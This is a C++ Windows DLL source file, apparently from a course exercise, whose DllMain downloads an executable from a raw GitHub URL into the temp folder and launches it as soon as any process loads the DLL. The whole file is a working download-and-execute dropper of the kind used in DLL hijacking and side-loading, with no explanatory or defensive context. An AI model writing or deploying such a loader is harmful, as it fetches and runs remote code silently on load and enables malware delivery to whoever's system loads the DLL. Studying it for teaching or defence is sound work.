#include "pch.h"
#include <windows.h>
#include <urlmon.h>
#include <cstdio>    // or <stdio.h>
#include <cwchar>    // or <wchar.h>
#include <shellapi.h>  // For ShellExecuteExW
#pragma comment(lib, "urlmon.lib")

BOOL DownloadAndExecute(LPCWSTR url, LPCWSTR filePath) {
    // Download the file from the URL to the specified filePath.
    HRESULT hr = URLDownloadToFileW(NULL, url, filePath, 0, NULL);
    if (hr != S_OK) {
        // Show a message if download fails.
        wchar_t msg[256];
        swprintf_s(msg, 256, L"Download failed. HRESULT: 0x%08X", hr);
        MessageBoxW(NULL, msg, L"Download Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }

    // Execute the downloaded file.
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = filePath;
    sei.nShow = SW_SHOWNORMAL;

    if (!ShellExecuteExW(&sei)) {
        MessageBoxW(NULL, L"Execution failed (ShellExecuteExW).", L"Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }

    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    {
        // A proper raw link from GitHub to the actual .exe file
        LPCWSTR gitHubUrl = L"https://raw.githubusercontent.com/TzuChunHsu/IT488/main/helloDll.exe";

        // Build a temporary file path in the system temp folder.
        WCHAR tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        wcscat_s(tempPath, MAX_PATH, L"helloDll.exe");

        // Download the executable from GitHub and execute it.
        DownloadAndExecute(gitHubUrl, tempPath);
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
